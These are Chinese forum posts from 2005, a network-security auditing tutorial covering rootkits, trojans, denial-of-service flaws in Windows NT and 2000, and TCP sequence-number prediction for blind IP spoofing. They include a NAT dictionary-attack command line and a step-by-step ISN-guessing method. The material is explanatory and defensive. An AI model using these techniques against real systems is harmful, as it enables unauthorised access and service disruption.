　　虽然大多数的厂商都为其产品的问题发布了修补方法，但你必须充分理解补上了哪些漏洞。如果操作系统或程序很复杂，这些修补可能在补上旧问题的同时又开启了新的漏洞。因此，你需要在实施升级前进行测试。这些测试工作包括在隔离的网段中验证它是否符合你的需求。当然也需要参照值得信赖的网络刊物和专家的观点。 

　　审计Trap Door和Root Kit 

　　Root kit是用木马替代合法程序。Trap Door是系统上的bug，当执行合法程序时却产生了非预期的结果。如老版本的UNIX sendmail，在执行debug命令时允许用户以root权限执行脚本代码，一个收到严格权限控制的用户可以很轻易的添加用户账户。 

　　虽然root kit通常出现在UNIX系统中，但攻击者也可以通过看起来合法的程序在Windows NT中置入后门。象NetBus,BackOrifice和Masters of Paradise等后门程序可以使攻击者渗透并控制系统。木马可以由这些程序产生。如果攻击者够狡猾，他可以使这些木马程序避开一些病毒检测程序，当然用最新升级的病毒检测程序还是可以发现它们的踪迹。在对系统进行审计时，你可以通过校验分析和扫描开放端口的方式来检测是否存在root kit等问题。 

　　审计和后门程序 

　　通常，在服务器上运行的操作系统和程序都存在代码上的漏洞。例如，最近的商业Web浏览器就发现了许多安全问题。攻击者通常知道这些漏洞并加以利用。就象你已经知道的RedButton，它利用了Windows NT的漏洞使攻击者可以得知缺省的管理员账号，即使账号的名称已经更改。后门（back door）也指在操作系统或程序中未记录的入口。程序设计人员为了便于快速进行产品支持有意在系统或程序中留下入口。不同于bug，这种后门是由设计者有意留下的。例如，像Quake和Doom这样的程序含有后门入口允许未授权的用户进入游戏安装的系统。虽然看来任何系统管理员都不会允许类似的程序安装在网络服务器上，但这种情况还是时有发生。 

　　从后门程序的危害性，我们可以得出结论，在没有首先阅读资料和向值得信赖的同事咨询之前不要相信任何新的服务或程序。在你进行审计时，请花费一些时间仔细记录任何你不了解它的由来和历史的程序。 
　　审计拒绝服务攻击 

　　Windows NT 易遭受拒绝服务攻击，主要是由于这种操作系统比较流行并且没有受到严格的检验。针对NT服务的攻击如此频繁的原因可以归结为：发展势头迅猛但存在许多漏洞。在审计Windows NT网络时，一定要花时间来验证系统能否经受这种攻击的考验。打补丁是一种解决方法。当然，如果能将服务器置于防火墙的保护之下或应用入侵监测系统的话就更好了。通常很容易入侵UNIX操作系统，主要因为它被设计来供那些技术精湛而且心理健康的人使用。在审计UNIX系统时，要注意Finger服务，它特别容易造成缓冲区溢出。 

　　缓冲区溢出 

　　缓冲区溢出是指在程序重写内存块时出现的问题。所有程序都需要内存空间和缓冲区来运行。如果有正确的权限，操作系统可以为程序分配空间。C和C++等编程语言容易造成缓冲区溢出，主要因为它们不先检查是否有存在的内存块就直接调用系统内存。一个低质量的程序会不经检查就重写被其它程序占用的内存，而造成程序或整个系统死掉，而留下的shell有较高的权限，易被黑客利用运行任意代码。 

　　据统计，缓冲区溢出是当前最紧迫的安全问题。要获得关于缓冲区溢出的更多信息，请访问Http://www-4.ibm.com/software/de ... verflows/index.heml 
Telnet的拒绝服务攻击 

　　Windows中的Telnet一直以来都是网络管理员们最喜爱的网络实用工具之一，但是一个新的漏洞表明，在Windows2000中Telnet在守护其进程时，在已经被初始化的会话还未被复位的情况下很容易受到一种普通的拒绝服务攻击。Telnet连接后，在初始化的对话还未被复位的情况下，在一定的时间间隔之后，此时如果连接用户还没有提供登录的用户名及密码，Telnet的对话将会超时。直到用户输入一个字符之后连接才会被复位。如果恶意用户连接到Windows2000的Telnet守护进程中，并且对该连接不进行复位的话，他就可以有效地拒绝其他的任何用户连接该Telnet服务器，主要是因为此时Telnet的客户连接数的最大值是1。在此期间任何其他试图连接该Telnet服务器的用户都将会收到如下错误信息： 

　　Microsoft Windows Workstation allows only 1 Telnet Client LicenseServer has closed connection 

　　察看“列出当前用户”选项时并不会显示超时的会话，因为该会话还没有成功地通过认证。 

　　Windows NT的TCP port 3389存在漏洞 

　　Windows NT Server 4.0 终端服务器版本所作的 DoS 攻击。这个安全性弱点让远端使用者可以迅速的耗尽 Windows NT Terminal Server 上所有可用的内存，造成主机上所有登陆者断线，并且无法再度登入。 

　　说明： 

　　1. Windows NT Server 4.0 终端服务器版本在 TCP port 3389 监听终端连接 (terminal connection)，一旦某个 TCP 连接连上这个端口, 终端服务器会开始分配系统资源，以处理新的客户端连接，并作连接的认证工作。 

　　2. 此处的漏洞在于：在认证工作完成前，系统需要拨出相当多的资源去处理新的连 接，而系统并未针对分配出去的资源作节制。因此远端的攻击者可以利用建立大 量 TCP 连接到 port 3389 的方法，造成系统存储体配置达到饱和。 

　　3. 此时服务器上所有使用者连接都会处于超时状态，而无法继续连接到服务器上，远端攻击者仍能利用一个仅耗用低频宽的程式，做出持续性的攻击，让此 服务器处於最多记忆体被耗用的状态，来避免新的连接继续产生。 

　　4. 在国外的测试报告中指出，长期持续不断针对此项弱点的攻击，甚至可以导致服务器持续性当机，除非重新开机，服务器将无法再允许新连接的完成。 

　　解决方案： 

　　1. 以下是修正程序的网址： 

　　ftp://ftp.microsoft.com/bussys/w ... sa/NT40tse/hotfixes postSP4/Flood-fix/ 

　　[注意]：因为行数限制，上面网址请合并为一行。 

　　2. 更详细资料请参考 Microsoft 网站的网址： 

　　http://www.microsoft.com/security/bulletins/ms99-028.asp. 

　　防范拒绝服务攻击 

　　你可以通过以下方法来减小拒绝服务攻击的危害： 

　　・ 加强操作系统的补丁等级。 

　　・ 如果有雇员建立特定的程序，请特别留意代码的产生过程。 

　　・ 只使用稳定版本的服务和程序。 

　　审计非法服务，特洛伊木马和蠕虫 

　　非法服务开启一个秘密的端口，提供未经许可的服务，常见的非法服务包括： 

　　・ NetBus 

　　・ BackOrifice 和 BackOrifice 2000 

　　・ Girlfriend 

　　・ 冰河2.X 

　　・ 秘密的建立共享的程序 

　　许多程序将不同的非法服务联合起来。例如，BackOrifice2000允许你将HTTP服务配置在任意端口。你可以通过扫描开放端口来审计这类服务，确保你了解为什么这些端口是开放的。如果你不知道这些端口的用途，用包嗅探器和其它程序来了解它的用途。 

　　技术提示：不要混淆非法服务和木马。木马程序通常包含非法服务，而且，木马程序还可以包含击键记录程序，蠕虫或病毒。 

　　特洛伊木马 

　　特洛伊木马是在执行看似正常的程序时还同时运行了未被察觉的有破坏性的程序。木马通常能够将重要的信息传送给攻击者。攻击者可以把任意数量的程序植入木马。例如，他们在一个合法的程序中安放root kit或控制程序。还有一些通常的策略是使用程序来捕获密码和口令的hash值。类似的程序可以通过E-mail把信息发送到任何地方。 

　　审计木马 

　　扫描开放端口是审计木马攻击的途径之一。如果你无法说明一个开放端口用途，你也许就检测到一个问题。所以，尽量在你的系统上只安装有限的软件包，同时跟踪这些程序和服务的漏洞。许多TCP/IP程序动态地使用端口，因此，你不应将所有未知的端口都视为安全漏洞。在建立好网络基线后，你便可以确定哪些端口可能存在问题了。 

　　蠕虫 

　　Melissa病毒向我们展示了TCP/IP网络是如何容易遭受蠕虫攻击的。在你审计系统时，通常需要配置防火墙来排除特殊的活动。防火墙规则的设置超出了本术的范围。但是，作为审计人员，你应当对建议在防火墙上过滤那些从不信任的网络来的数据包和端口有所准备。 

　　蠕虫靠特定的软件传播。例如，在2000年三月发现的Win32/Melting.worm蠕虫只能攻击运行Microsoft Outlook程序的Windows操作系统。这种蠕虫可以自行传播，瘫痪任何种类的Windows系统而且使它持续地运行不稳定。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:55am 

网络安全知识（3） 

结合所有攻击定制审计策略 
　　攻击者有两个共同的特点。首先，他们将好几种不同的方法和策略集中到一次攻击中。其次，他们在一次攻击中利用好几种系统。综合应用攻击策略可以增强攻击的成功率。同时利用好几种系统使他们更不容易被捕获。 

　　例如，在实施IP欺骗时，攻击者通常会先实施拒绝服务攻击以确保被攻击主机不会建立任何连接。大多数使用Man-in-the-middle的攻击者会先捕获SMB的密码，再使用L0phtCrack这样的程序进行暴力破解攻击。 

　　渗透策略 

　　你已经了解到那些网络设备和服务是通常遭受攻击的目标和黑客活动的攻击特征。现在，请参考下列的一些场景。它们将有助于你在审计过程中关注那些设备和服务。请记住，将这些攻击策略结合起来的攻击是最容易成功的。 

　　物理接触 

　　如果攻击者能够物理接触操作系统，他们便可以通过安装和执行程序来使验证机制无效。例如，攻击者可以重启系统，利用其它启动盘控制系统。由于一种文件系统可以被另一种所破坏，所以你可以使用启动盘获得有价值的信息，例如有管理权限的账号。 

　　物理攻击的简单例子包括通过重新启动系统来破坏Windows95或98的屏幕锁定功能。更简单的物理攻击是该系统根本就没有进行屏幕锁定。 

　　操作系统策略 

　　近来，美国白宫的Web站点（http://www.whitehouse.gov）被一个缺乏经验的攻击者黑掉。攻击者侦查出该Web服务器（www1.whitehouse.gov）运行的操作系统是Solaris 7。虽然Solaris 7被成为艺术级的操作系统，但管理员并没有改变系统的缺省设置。虽然该站点的管理员设置了tripwire，但攻击者还是使用phf/ufsrestore命令访问了Web服务器。 

　　较弱的密码策略 

　　上面白宫网站被黑的例子可能是由于该系统管理员使用FTP来升级服务器。虽然使用FTP来更新网站并没有错，但大多数FTP会话使用明文传输密码。很明显，该系统管理员并没有意识到这种安全隐患。又由于大多数系统管理员在不同的服务上使用相同的密码，这使攻击者能够获得系统的访问权。更基本的，你可以保证/etc/passwd文件的安全。 

　　NetBIOS Authentication Tool（NAT） 

　　当攻击者以WindowsNT为目标时，他们通常会使用NetBIOS Authentication Tool（NAT）来测试弱的口令。这个程序可以实施字典攻击。当然它也有命令行界面，这种界面的攻击痕迹很小。而且命令行界面的程序也很好安装和使用。在使用NAT时，你必须指定三个文本文件和IP地址的范围。当然，你也可以指定一个地址。NAT使用两个文本文件来实施攻击而第三个来存储攻击结果。第一个文本文件包含一个用户列表，第二个文件中是你输入的猜测密码。 

　　当使用命令行版本时，语法格式为： 

　　 nat Cu username.txt Cp passwordlist.txt Co outputfile.txt 

　　即使服务器设置了密码的过期策略和锁定，攻击者还是可以利用NAT反复尝试登录来骚扰管理员。通过简单地锁定所有已知的账号，攻击者会极大地影响服务器的访问，这也是一些系统管理员不强行锁定账号的原因。 

　　较弱的系统策略 

　　到此为止，你已经学习了一些外部攻击。然而，对于管理员来说最紧迫的是大多数公司都存在不好的安全策略。如果安全策略很弱或干脆没有安全策略，通常会导致弱的密码和系统策略。通常，公司并不采取简单的预防措施，比如需要非空的或有最小长度要求的密码。忽略这些限制会给攻击者留下很大的活动空间。 

　　审计文件系统漏洞 

　　不论你的操作系统采取何种文件系统（FAT，NTFS或NFS），每种系统都有它的缺陷。例如，缺省情况下NTFS在文件夹和共享创建之初everyone组可完全控制。由于它是操作系统的组成部分（Windows NT），因此也成为许多攻击的目标。NFS文件系统可以共享被远程系统挂接，因此这也是攻击者入侵系统的途径之一。 

　　IP欺骗和劫持：实例 

　　IP欺骗是使验证无效的攻击手段之一，也是如何组合攻击策略攻击网络的典型实例。IP欺骗利用了Internet开放式的网络设计和传统的建立在UNIX操作系统之间信任关系。主要的问题是使用TCP/IP协议的主机假设所有从合法IP地址发来的数据包都是有效的。攻击者可以利用这一缺陷，通过程序来发送虚假的IP包，从而建立TCP连接，攻击者可以使一个系统看起来象另一个系统。 

　　许多UNIX操作系统通过rhosts和rlogin在非信任的网络上（如Internet）建立信任的连接。这种传统的技术是流行的管理工具并减轻了管理负担。通常，这种系统由于把UNIX的验证机制和IP地址使用相结合从而提供了适当的安全。然而，这种验证机制是如此的独立于IP地址不会被伪造的假设，以至于很容易被击破。 

　　Non-blind spoofing 和Blind spoofing 

　　Non-blind spoofing是指攻击者在同一物理网段上操纵连接。Blind spoofing是指攻击者在不同的物理网段操纵连接。后者在实施上更困难，但也时常发生。 

　　进行IP欺骗的攻击者需要一些程序，包括： 

　　・ 一个包嗅探器 

　　・ 一个能够同时终止TCP连接、产生另一个TCP连接、进行IP 伪装的程序 

　　IP欺骗涉及了三台主机。像先前分析的那样，使用验证的服务器必须信任和它建立连接的主机。如果缺乏天生的安全特性，欺骗是非常容易的。 

　　思考下列的场景，有三台主机分别是A,B和C。A使用TCP SYN连接与合法用户B初始一个连接。但是B并没有真正参与到这次连接中，因为C已经对B实施了拒绝服务攻击。所以，虽然A认为是在与B对话，但实际上是与C对话。IP欺骗实际上组合了几种攻击手法包括对系统实施了拒绝服务攻击，还包括利用验证技术。 

　　作为审计人员，你不应该说服管理员终止这种信任关系，相反，你应当建议使用防火墙规则来检测有问题的包。 
TCP/IP序列号生成方法 

　　TCP的Initial Sequence Number(ISN)的预测 


(图1) 

　　正常的TCP连接基于一个三次握手(3-way handshake)，一个客户端(Client)向服务器(Server)发送一个初始化序列号ISNc， 随后，服务器相应这个客户端ACK(ISNc),并且发送自己的初始化序列号ISNs，接着，客户端响应这个ISNs（如下图），三次握手完成。 

　　 C ---〉S: (ISNc) 

　　 S ---〉C: ACK(ISNc)+ ISNs 

　　 C ---〉S: ACK(ISNs) 

　　 C ---〉S: data 

　　 and / or 

　　 S ---〉C: data 

　　下面，我以Windows2000 Advanced Server为例，来说一下两台主机是如何进行三次握手。 


(图2) 


(图3) 

　　我们可以看到： 

　　1) Smartboy首先发送一个seq:32468329的包给服务器202.116.128.6。 

　　2) 然后, 202.116.128.6响应主机Smartboy, 它送给Smartboy自己的 

　　 seq:3333416325 而且响应Smartboy的ack:3240689240。 

　　3) Smartboy再响应服务器202.116.128.6, seq:3240689240, ack:3333416326。 

　　 三次握手完毕，两台几建立起连接。 

　　 可以看出，在三次握手协议中，Clinet一定要监听服务器发送过来的ISNs, TCP使用的sequence number是一个32位的计数器，从0-4294967295。TCP为每一个连接选择一个初始序号ISN，为了防止因为延迟、重传等扰乱三次握手，ISN不能随便选取，不同系统有不同算法。理解TCP如何分配ISN以及ISN随时间变化的规律，对于成功地进行IP欺骗攻击很重要。 

　　在Unix系统里，基于远程过程调用RPC的命令，比如rlogin、rcp、rsh等等，根据/etc/hosts.equiv以及$HOME/.rhosts文件进行安全校验，其实质是仅仅根据源IP地址进行用户身份确认，以便允许或拒绝用户RPC。这就给与了那些攻击者进行IP地址欺骗的机会。 

　　 让我们看X是如何冒充T来欺骗S，从而建立一个非法连接 ： 

　　 X---->S: SYN(ISNx ) , SRC = T 

　　 S---->T: SYN(ISNs ) , ACK(ISNT) （*） 

　　 X---->S: ACK(ISNs+1 ) , SRC = T （**） 

　　 X---->S: ACK(ISNs +1) , SRC = T, 攻击命令（可能是一些特权命令） 

　　 但是，T必须要在第（**）中给出ISNs, 问题是ISNs在第（*）步中发给了T(X当然很难截取到)，幸运的是，TCP协议有一个约定: ISN变量每秒增加250,000次，这个增加值在许多版本比较旧的操作系统中都是一个常量，在FreeBSD4.3中是125000次每秒，这就给X一个可乘之机。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:56am 

网络安全知识（4） 

看一下X是如何猜出ISNs :　 

　　 a、首先，　X发送一个SYN包来获取服务器现在的ISNs 

　　　　 X ---〉S: (ISNx) 

　　　　 S ---〉X: ACK(ISNx)+ ISNs# (1) 

　　 b、紧接着，X冒充T向服务器发送SYN包 

　　　　 　　 X ---〉S: SYN(ISNx ) , SRC = T (2) 

　　 c、于是，服务器发出一个响应包给T(这个包X是收不到的) 

　　　　 S ---〉T: SYN(ISNs$) , ACK(ISNT ) (3) 

　　 d、X计算ISNs$: 

　　　　　　　ISNs$　=　ISNs#　+ RTT×Increment of ISN　(4) 

　　其中，RTT(Round Trip Time),是一个包往返X和S所用的时间,可以通过Ping 来得到。 


(图4) 

　　上图显示了round trip times (RTT) 大概是０。 

　　Increment of ISN是协议栈的初始序列号每秒钟增加的值，以Unix为例，当没有外部连接发生时，服务器的ISN每秒增加128,000,有连接的时候，服务器的ISN每秒增加64,000。 

　　 e、于是， 

　　　　X ---> S : ACK(ISNs$) 　　（冒充可信主机成功了） 

　　　　X ---> S : 恶意的命令或窃取机密消息的命令 

　　在评价以下的解决方案时有几点要注意： 

　　1.该解决方案是否很好地满足TCP的稳定性和可操作性的要求？ 
　　2.该解决方案是否容易实现? 
　　3.该解决方案对性能的影响如何? 
　　4.该解决方案是否经得起时间的考验？ 

　　以下的几种方案各有各的优点和缺点，它们都是基于增强ISN生成器的目标提出的。 

　　配置和使用密码安全协议 

　　TCP的初始序列号并没有提供防范连接攻击的相应措施。TCP的头部缺少加密选项用于强加密认证，于是，一种叫做IPSec的密码安全协议的技术提出了。IPSec提供了一种加密技术（End to end cryptographic），使系统能验证一个包是否属于一个特定的流。这种加密技术是在网络层实现的。其它的在传输层实现的解决方案（如SSL/TLS和SSH1/SSH2）, 只能防止一个无关的包插入一个会话中，但对连接重置（拒绝服务）却无能为力，原因是因为连接处理是发生在更低的层。IPSec能够同时应付着两种攻击（包攻击和连接攻击）。它直接集成在网络层的安全模型里面。 

　　上面的解决方案并不需要对TCP协议做任何得修改，RFC2385(“基于TCP MD5签名选项的BGP会话保护)和其他的技术提供了增加TCP头部的密码保护，但是，却带来了收到拒绝服务攻击和互操作性和性能方面的潜在威胁。使用加密安全协议有几个优于其它方案的地方。TCP头部加密防止了Hijacking和包扰乱等攻击行为，而TCP层仍然能够提供返回一个简单增加ISN的机制，使方案提供了最大程度的可靠性。但实现IPSec非常复杂，而且它需要客户机支持，考虑到可用性，许多系统都选择使用RFC 1948。 

　　使用RFC1948 

　　在RFC1948中，Bellovin提出了通过使用4-tuples的HASH单向加密函数，能够使远程攻击者无从下手（但不能阻止同一网段的攻击者通过监听网络上的数据来判断ISN）。 

　　Newsham 在他的论文 [ref_newsham]中提到: 

　　RFC 1948 [ref1]提出了一种不容易攻击（通过猜测）的TCP ISN的生成方法。此方法通过连接标识符来区分序列号空间。每一个连接标识符由本地地址，本地端口，远程地址，远程端口来组成，并由一个函数计算标识符分的序列号地址空间偏移值（唯一）。此函数不能被攻击者获得，否则，攻击者可以通过计算获得ISN。于是，ISN就在这个偏移值上增加。ISN的值以这种方式产生能够抵受上面提到的对ISN的猜测攻击。 

　　一旦全局ISN空间由上述方法来生成，所有的对TCP ISN的远程攻击都变得不合实际。但是，需要指出的，即使我们依照RFC 1948来实现ISN的生成器，攻击者仍然可以通过特定的条件来获得ISN(这一点在后面叙述). 

　　另外，用加密的强哈希算法(MD5)来实现ISN的生成器会导致TCP的建立时间延长。所以，有些生成器（如Linux　kernel ）选择用减少了轮数的MD4函数来提供足够好的安全性同时又把性能下降变得最低。削弱哈希函数的一个地方是每几分钟就需要对生成器做一次re-key 的处理，经过了一次re-key的处理后，安全性提高了，但是，RFC793提到的可靠性却变成另一个问题。 

　　我们已经知道，严格符合RFC1948的ISN生成方法有一个潜在的危机： 

　　一个攻击者如果以前合法拥有过一个IP地址，他通过对ISN进行大量的采样，可以估计到随后的ISN的变化规律。在以后，尽管这个IP地址已经不属于此攻击者，但他仍然可以通过猜测ISN来进行IP欺骗。 

　　以下，我们可以看到RFC 1948的弱点: 

　　ISN = M + F(sip, sport, dip, dport, 

　　) 

　　其中 

　　ISN 32位的初始序列号 

　　M 单调增加的计数器 

　　F 单向散列哈希函数 (例如 MD4 or MD5) 

　　sip 源IP地址 

　　sport 源端口 

　　dip 目的IP地址 

　　dport 目的端口 

　　哈希函数可选部分，使远程攻击者更难猜到ISN. 

　　ISN自身的值是按照一个常数值稳定增加的,所以F()需要保持相对的稳定性。而根据Bellovin 所提出的，是一个系统特定的值（例如机器的启动时间，密码，初始随机数等），这些值并不 会经常变。 

　　但是，如果Hash函数在实现上存在漏洞（我们无法保证一个绝对安全的Hash函数，况且，它的实现又与操作系统密切相关），攻击者就可以通过大量的采样，来分析，其中，源IP地址，源端口，目的IP地址，目的端口都是不变的，这减少了攻击者分析的难度。 

　　Linux TCP的ISN生成器避免了这一点。它每５分钟计算一次值,把泄漏的风险降到了最低。 

　　有一个办法可以做的更好： 

　　取M = M + R(t) 

　　ISN = M + F(sip, sport, dip, dport, ) 

　　其中 

　　R(t) 是一个关于时间的随机函数 

　　很有必要这样做，因为它使攻击者猜测ISN的难度更大了（弱点在理论上还是存在的）。 
其它一些方法 

　　构造TCP ISN生成器的一些更直接的方法是：简单地选取一些随机数作为ISN。这就是给定一个32位的空间，指定　ISN = R(t)。(假设R()是完全的非伪随机数生成函数) 

　　固然，对于完全随机的ISN值，攻击者猜测到的可能性是１／２32是，随之带来的一个问题是ISN空间里面的值的互相重复。这违反了许多RFC(RFC 793, RFC 1185, RFC 1323, RFC1948等)的假设----ISN单调增加。这将对TCP协议的稳定性和可靠性带来不可预计的问题。 

　　其它一些由Niels Provos（来自OpenBSD 组织）结合完全随机方法和RFC 1948解决方案： 

　　ISN = ((PRNG(t)) << 16) + R(t)　　　　 ３２位 

　　其中 

　　PRNG(t) ：一组随机指定的连续的１６位数字　　0x00000000 -- 0xffff0000 

　　R(t) ：16位随机数生成器（它的高位msb设成０）0x00000000 -- 0x0000ffff 

　　上面的公式被用于设计OpenBsd的ISN生成器，相关的源代码可以从下面的网址获得 

http://www.openbsd.org/cgi-bin/cvsweb/src/...inet/tcp_subr.c 

　　Provos的实现方法有效地生成了一组在给定时间内的不会重复的ISN的值，每两个ISN值都至少相差32K,这不但避免了随机方法造成的ISN的值的冲突，而且避免了因为哈希函数计算带来的性能上的下降，但是，它太依赖于系统时钟，一旦系统时钟状态给攻击者知道了，就存在着系统的全局ISN状态泄密的危机。 

　　TCP ISN生成器的构造方法的安全性评估 

　　ISN与PRNGs(伪随机数生成器) 

　　我们很难用一台计算机去生成一些不可预测的数字，因为，计算机被设计成一种以重复和准确的方式去执行一套指令的机器。所以，每个固定的算法都可以在其他机器上生成同样的结果。如果能够推断远程主机的内部状态，攻击者就可以预测它的输出；即使不知道远程主机的PNRG函数，但因为算法最终会使ISN回绕，按一定的规律重复生成以前的ISN,所以，攻击者仍然可以推断ISN。幸运的是，目前条件下，ISN的重复可以延长到几个月甚至几年。但是，仍然有部分PRNG生成器在产生500个元素后就开始回绕。解决伪随机数的方法是引入外部随机源，击键延时，I/O中断，或者其它对攻击者来说不可预知的参数。把这种方法和一个合理的HASH函数结合起来，就可以产生出32位的不可预知的TCP ISN的值，同时又隐蔽了主机的PNRG的内部状态。不幸的是，很少的TCP ISN产生器是按这种思路去设计的，但即使是这样设计的产生器，也会有很多的实现上的漏洞使这个产生器产生的ISN具有可猜测性。 

　　RFC1948的建议提供了一种比较完善的方法，但是，对攻击者来说，ISN仍然存在着可分析性和猜测性。其中，PRNG的实现是个很关键的地方。
网络安全知识（5） 

　　Spoofing 集合 

　　需要知道一点是，如果我们有足够的能力能够同时可以发出２32个包，每个包由不同的ISN值，那么，猜中ISN的可能性是100%。但是，无论从带宽或计算机的速度来说都是不实际的。但是，我们仍然可以发大量的包去增加命中的几率，我们把这个发出的攻击包的集合称为Spoofing集合。通常，从计算机速度和网络数据上传速率两方面来考虑，含5000个包的Spoofing的集合对众多的网络用户是没有问题的，5000-60000个包的Spoofing集合对宽带网的用户也是不成问题的，大于60000个包的Spoofing集合则超出一般攻击者的能力。网络的速度和计算机性能的不断增加会提高那种使用穷尽攻击方法猜测ISN的成功率。从攻击者的立场，当然希望能够通过定制一个尽可能小的Spoofing集合，而命中的几率又尽可能高。我们假定我们攻击前先收集50000个包作为ISN值的采样，然后，我们把这些ISN用作对将来的ISN的值猜测的依据。 
　　一种称为“delay coordinates”的分析方法 

　　在动态系统和非线性系统中，经常使用一种叫做“delay coordinates”的分析法，这种方法使我们可以通过对以前的数据的采样分析来推想以后的数据。 

　　我们试图以建立一个三维空间（x,y,z）来观察ISN值（seq[t]）的变化，其中t取0,1,2, …… 


(图6) 

　　方程组（E1） 

　　现在，对采样了的50000个ISN序列seq[t] 按照上面的三个方程式来构建空间模型A。这样，就可以通过A的图像特征来分析这个PNRG生成的ISN值的规律。Ａ呈现的空间模型的３D特性越强，它的可分析性就越好。 

　　接着，我们根据这个模型，去分析下一个ISN值seq[t],为此，我们用一个集合K(5000个)去猜测seq[t]。 

　　如果我们知道seq[t-1],要求seq[t],那么，可以通过在这个三维空间中找出一个有良好特性的节点P(x,y,z)，将P.x+seq[t-1],我们就可以得到seq[t]。现在，我们将注意力放到怎样在这个三维空间中选择一些点来构成Spoofing集合，也就是怎样通过seq[t-1],seq[t-2],sea[t-3]来推知seq[t]。 

　　由于seq[t-1],seq[t-2],seq[t-3]都可以很容易地在远程主机上探测到，于是，P.y和P.z可以通过以下的公式求出 


(图7) 

　　而对于P.x=seq[t]-seq[t-1], 由于seq[t-1]已知，所以，我们可以把它当作是空间的一条直线。如果，在对以前的ISN的采样，通过上面提到的构成的空间模型A呈现某种很强的特征，我们就可以大胆地假设，seq[t]在直线与A的交点上,或者在交点的附近。这样，seq[t]就这样确定了，于是，seq[t+1],seq[t+2]……,我们都可以推断出来。 


(图8) 

　　于是，我们大致将构造Spoofing集合分成3个步骤：　 

　　先选取L与A交点之间的所有点。如果，L与A没有交点，我们则选取离L最近的A的部分点。 

　　假设现在 seq[t-1]=25 

　　 seq[t-2]=50 

　　 seq[t-3]=88 

　　 于是，我们可以计算出 

　　 y = seq[t-1] - seq[t-2]=25 

　　 z = seq[t-2] - seq[t-3]=33 

　　而我们在集合A中找不到满足y=25,z=33这个点，但是，我们找到y=24,z=34和y=27,z=35这两个点，所以，我们要把它们加入Spoofing集合。 

　　我们按照上面的方法，把在A附近（半径<=R1的空间范围内）点集M找出来，然后，我们根据这些点的相应的x值去推导相应的seq[t]（按照一定的算法，后面会提到）,于是，我们就得到很多的seq[t]。 

　　根据点集M(j),我们在一定的变化浮动范围U里（-R2<=U<=+R2）处理其x值，得出以下的集合K： 

　　M(j).x+1 M(j).x-1 M(j).x+2 M(j).x-2 M(j).x+3 M(j).x-3 …… M(j).x+R2 M(j)-R2 

　　接着我们确定R1和R2的值 

　　　　　　R1值的选取的原则：使M不为空集，一般为1-500个。 

　　　　　　R2值的选取的原则：使K的个数为5000。 

　　 对TCP ISN的PRNG分析的总体流程： 


(图9) 

　　相关系数的意义： 

　　R1 radius: 影响搜索速度。 

　　R2 radius: 影响猜测ISN的成功率， R2越大，成功率越高，但代价越大。 

　　Average error: 反映了在3.3.2中找出的点集的平均距离。一个过分大的平均距离是不需要的。可以通过是否有足够的正确的猜测值来计算Average error。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:56am 

网络安全知识（6） 


delay coordinates分析法的意义 

　　站在攻击者的立场，他是千方百计地想缩小搜索空间，他希望先搜索一些最可能的值，然后再去搜索其它可能性没那么大的值。通过delay coordinates，他可以看去观察ISN数列的特征，如果，按照上面的方法构造的空间模型Ａ呈现很明显的空间轮廓，如一个正方体，一个圆柱体，或者一个很小的区域，那么ISN很可能就是这个空间模型Ａ中的一点，搜索空间就会可以从一个巨大的三维空间缩小到一个模型Ａ。看一下一个设计得很好的PRNG（输出为32位）：...2179423068, 2635919226, 2992875947, 3492493181, 2448506773, 2252539982, 2067122333, 1029730040, 335648555, 427819739... 


(图10) 

　　RFC 1948要求我们用31位的输出，但是，32位的搜索空间比31位的要大一倍，所以，在后面的PRNG的设计中，我采用了32位的输出。 

　　下面，我们来看一下各种典型的空间模型以及对它们的评价。 


(图11) 

　　从空间特性可以看出，某些区域的值互相重叠，某些地方的空间形状很明显，呈针状型，这种PRNG设计得不好，重叠特性很强，攻击者可以从左图分析推断可能性比较大的重叠区域去搜索，这样可以大大减少搜索的难度。 


(图12) 

　　这种PRNG参杂了一些可以预测的随机种子，导致空间模型呈现很明显的片状。攻击者可以根据前面的一些ISN来推测后面的ISN。 


(图13) 

　　这种PRNG产生的随机数序列之间的差值非常小，但是，它的分布特性非常好。所以，虽然，它并没有扩展到整个空间，但是，它比上面几种模型要好的多。攻击者攻击的成功率要少得多。 


(图14) 

　　这个PRNG是以计算机时钟为随机源的。它的ISN值都分布在三个很明显的面上。三个面都在模型的中间有一个汇聚点。这样的PRNG设计的非常差，所以，我们在设计PRNG的时候，不能只是以时钟作为随机源。 

各种操作系统的TCP ISN生成器的安全性比较 

　　Windwos 98 SE 


(图15) 

　　但很难明白为什么Windows 98的算法更弱。我们看到R1为0，也就是说，A的空间特性太明显，以致M集只需要一个点就可以算出seq[t]。我们看到，Windows 98的R2小于Windows 95的R2，换言之，Windows 98的seq[t]的搜索代价更少。 

　　Windows NT4 SP3，Windows SP6a和Windows 2000 


(图16) 

　　Windows NT4 SP3在ISN的PNRG算法也是非常弱的，成功率接近100%。Windows 2000和Windows NT4 SP6a的TCP 序列号有着相同的可猜测性。危险程度属于中到高的范围。虽然，我们在图上看不到很明显的3D结构化特征，但是，12%和15%对攻击者来说，已经是一个很满意的结果。 

　　FreeBSD 4.2,OpenBSD 2.8和OpenBSD-current 


(图17) 

　　OpenBSD-current的PRNG 输出为31-bit,也就是说，△seq[t]的值域范围可以是231 C1，意味着,y,z值域也很大，这对使我们很难确定M集，经过我们的处理后，可以看到一个云状物(见上图)，它的R1半径很大，而且分布均匀，不呈现任何的空间结构化特性，很难对它进行分析。 

　　Linux 2.2 


(图18) 

　　Linux 2.2的TCP/IP序列号的可分析性也是很少，比起OpenBSD-current,它的PRNG的输出宽度只有24bit，但是，对抵御攻击已经足够了。Linux是按照RFC 1948规范的。它的HASH函数从实现来说，应该是没有什么的漏洞，而且，它应该是引入了外部随机源。 

　　Solaris 

　　Solaris的内核参数tcp_strong_iss有三个值，当tcp_strong_iss=0时，猜中序列号的成功率是100%；当tcp_strong_iss=1时，Solaris 7和Solaris 8一样，都能产生一些特性相对较好的序列号。 


(图19) 

　　tcp_strong_iss=2时，依据Sun Microsystem的说法，系统的产生的ISN值非常可靠，不可预测。通过观察采样值的低位值的变化，可以相信它的PRNG的设计采用了RFC 1948规范，正如Solaris的白皮书所提到的。 


(图20) 

